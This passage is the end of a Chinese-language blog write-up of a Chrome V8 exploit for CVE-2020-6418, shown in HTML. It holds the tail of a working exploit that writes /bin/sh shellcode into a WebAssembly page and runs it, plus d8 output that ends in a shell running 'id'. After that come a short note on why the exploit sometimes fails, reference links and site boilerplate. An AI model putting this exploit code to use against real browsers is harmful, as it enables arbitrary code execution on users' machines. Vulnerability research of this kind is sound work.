function_">print</span>(<span class="string">&quot;Instance Address: &quot;</span> + instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;Shellcode Address: &quot;</span> + shellcode_addr.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> shellcode = [</span><br><span class="line">        <span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line">        <span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line">        <span class="number">0x00050fd231583b6an</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr, <span class="number">0n</span>);</span><br><span class="line">    <span class="title function_">fakeWrite</span>(base_pointer_addr - <span class="number">0x8n</span>, shellcode_addr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        uint64_array[i] = shellcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">wasm_func</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">rce</span>();</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">aluvion@Aluvion:~/桌面/v8/v8/out.gn/x64.release$ ./d8 index.js </span><br><span class="line">Uint64 Array Address: 08a63b05</span><br><span class="line">Base Pointer Address: 08a63b35</span><br><span class="line">Wasm Function Address: 08212f21</span><br><span class="line">Shared Info Address: 08212ef9</span><br><span class="line">Data Address: 08212ed9</span><br><span class="line">Instance Address: 08212e01</span><br><span class="line">Shellcode Address: 1a51d2db3000</span><br><span class="line">$ id</span><br><span class="line">uid=1000(aluvion) gid=1000(aluvion) groups=1000(aluvion),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)</span><br><span class="line">$ exit</span><br></pre></td></tr></table></figure>

<h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>在上文使用的漏洞利用代码中，如果将调用f函数的参数empty改为匿名函数function(){}，漏洞就会触发失败。</p>
<p>根据参考文章，原因应该跟JIT处理Reflect.construct有，留个坑，懒得继续看了。</p>
<hr>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/7314">browser-pwn cve-2020-6418漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/201951">Chrome漏洞调试笔记3-CVE-2020-6418</a></p>
<p><a href="https://blog.exodusintel.com/2020/02/24/a-eulogy-for-patch-gapping/">A EULOGY FOR PATCH-GAPPING CHROME</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
                    
                      <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2021/05/25/Java%E5%86%85%E5%87%A0%E4%B8%AA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%82%B9/">
                        <i class="fa fa-chevron-left"></i>
                        <span>Java内几个有意思的代码/命令执行点</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2021/04/20/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%BC%BA%E5%8C%962-CVE-2016-5168/">
                        <span>chrome浏览器漏洞强化2-CVE-2016-5168</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "chrome浏览器漏洞强化3-CVE-2020-6418&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
